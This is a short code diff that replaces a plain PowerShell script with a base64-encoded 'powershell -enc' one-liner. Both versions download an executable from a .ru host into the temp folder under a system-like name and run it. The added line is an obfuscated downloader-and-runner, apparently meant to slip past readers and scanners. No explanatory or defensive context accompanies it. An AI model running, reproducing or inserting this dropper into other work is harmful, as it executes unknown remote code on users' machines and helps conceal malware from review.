@@ -1,18 +1,1 @@
-# Define the URL of the executable and the output path
-$url = "http://a1067277.xsph.ru/1Elusion.exe"
-$outputPath = "$env:TEMP\LNsystem.exe"  # Change this to your desired path
-
-# Try to download and execute the file
-try {
-    # Download the executable file from the URL
-    Invoke-RestMethod -Uri $url -OutFile $outputPath
-
-    # Check if the file was downloaded successfully
-    if (Test-Path -Path $outputPath) {
-        # Execute the downloaded file normally (not in the background)
-        Start-Process -FilePath $outputPath -WindowStyle Normal
-    }
-} catch {
-    # Handle any errors
-    Write-Host "An error occurred: $_"
-}
+powershell -enc IyBEZWZpbmUgdGhlIFVSTCBvZiB0aGUgZXhlY3V0YWJsZSBhbmQgdGhlIG91dHB1dCBwYXRoCiR1cmwgPSAiaHR0cDovL2ExMDY3Mjc3LnhzcGgucnUvMUVsdXNpb24uZXhlIgokb3V0cHV0UGF0aCA9ICIkZW52OlRFTVBcTE5zeXN0ZW0uZXhlIiAgIyBDaGFuZ2UgdGhpcyB0byB5b3VyIGRlc2lyZWQgcGF0aAoKIyBUcnkgdG8gZG93bmxvYWQgYW5kIGV4ZWN1dGUgdGhlIGZpbGUKdHJ5IHsKICAgICMgRG93bmxvYWQgdGhlIGV4ZWN1dGFibGUgZmlsZSBmcm9tIHRoZSBVUkwKICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHVybCAtT3V0RmlsZSAkb3V0cHV0UGF0aAoKICAgICMgQ2hlY2sgaWYgdGhlIGZpbGUgd2FzIGRvd25sb2FkZWQgc3VjY2Vzc2Z1bGx5CiAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRvdXRwdXRQYXRoKSB7CiAgICAgICAgIyBFeGVjdXRlIHRoZSBkb3dubG9hZGVkIGZpbGUgbm9ybWFsbHkgKG5vdCBpbiB0aGUgYmFja2dyb3VuZCkKICAgICAgICBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkb3V0cHV0UGF0aCAtV2luZG93U3R5bGUgTm9ybWFsCiAgICB9Cn0gY2F0Y2ggewogICAgIyBIYW5kbGUgYW55IGVycm9ycwogICAgV3JpdGUtSG9zdCAiQW4gZXJyb3Igb2NjdXJyZWQ6ICRfIgp9
